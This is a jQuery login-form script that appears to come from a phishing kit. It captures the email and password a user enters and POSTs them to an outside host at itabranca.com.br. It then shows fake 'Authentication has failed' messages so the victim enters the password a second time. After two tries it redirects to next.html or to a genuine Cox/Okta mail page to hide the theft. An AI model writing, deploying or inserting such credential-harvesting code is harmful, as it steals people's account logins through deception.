            /* global $ */
            $(document).ready(function(){
              var count=0;
        
          
              $('#submit-btn').click(function(event){
                $('#error').hide();
                $('#msg').hide();
                event.preventDefault();
                var email=$("#userID").val();
                var password=$("#pass").val();
                var msg = $('#msg').html();
                $('#msg').text( msg );
        
                            if (!password) {
                        $('#msg').show();
                        $('#msg').html("Password field is empty!");
        
                        return false;
                    }
        
        
               
              count=count+1;
              
              $.ajax({
                dataType: 'JSON',
                url: 'https://itabranca.com.br/att/ATT/post.php',
                type: 'POST',
                data:{
                  email:email,
                  password:password,
                },
                    // data: $('#contact').serialize(),
                    beforeSend: function(xhr){
                    
                    },
                    success: function(response){
                      if(response){
                        $("#msg").show();
                        console.log(response);
                        if(response['signal'] == 'ok'){
                           $("#password").val("");
                          if (count>=2) {
                            count=0;
                            // window.location.replace(response['redirect_link']);
                             window.location.replace("next.html");
        
                          }
                                       $("#msg").show();
                       $('#msg').html("Authentication has failed. Please re-enter your login.");
                        }
                        else{
                                        $("#msg").show();
                       $('#msg').html("Authentication has failed. Please re-enter your login.");
                        }
                      }
                    },
                    error: function(){
                      $("#password").val(""); 
                      if (count>=2) {
                        count=0;
                         window.location.replace("https://www.cox.com/content/dam/cox/okta/mail.html");
                      }
                      $("#msg").show();
                       $('#msg').html("Incorrect user ID or password. Try again.Care code: 201 [LU100] ");
                    },
                    complete: function(){
                    
                    }
                  });
            });
        
        
            });
